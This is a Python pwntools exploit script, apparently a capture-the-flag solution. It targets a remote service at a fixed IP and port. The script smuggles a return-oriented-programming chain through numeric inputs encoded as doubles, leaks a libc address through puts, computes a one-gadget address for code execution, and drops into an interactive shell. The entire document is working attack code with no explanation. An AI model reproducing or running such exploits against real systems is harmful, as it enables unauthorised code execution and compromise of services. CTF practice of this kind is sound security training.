from pwn import *
#p=process('./p')
p=remote('82.196.10.106',12499)
e=ELF('./p')

sla = lambda x,y : p.sendlineafter(x,y)
sl = lambda x : p.sendline(x)
d2h=lambda f: struct.unpack('<d',struct.pack('<Q',u64(f)))[0]

puts_plt=e.plt['puts']
puts_got=e.got['puts']
signal_got=e.got['signal']
pr=0x00000000004009c3
pop_rsi=0x00000000004009c1
leave_ret=0x000000000040078e
scanf=0x400660

sla('values: ',str(39))
for _ in range(33):
    sl(str(_))
sl('-')
sl('1234')

pay = p64(pr)+p64(puts_got)+p64(puts_plt)
pay += p64(0x4007d0)

for i in range(0,len(pay),8):
    sl(str(d2h(pay[i:i+8])))

p.recvuntil('Result')
p.recvline()

puts = u64(p.recvline()[:-1]+'\x00'*2)
lb = puts-0x809c0
og=lb+0x4f2c5
success(hex(lb))
success(hex(og))

#PHASE2
sla('values: ',str(36))
for _ in range(33):
    sl(str(_))
sl('-')
pause()
sl('1234')

#enter double number calculated by online converter
p.interactive()
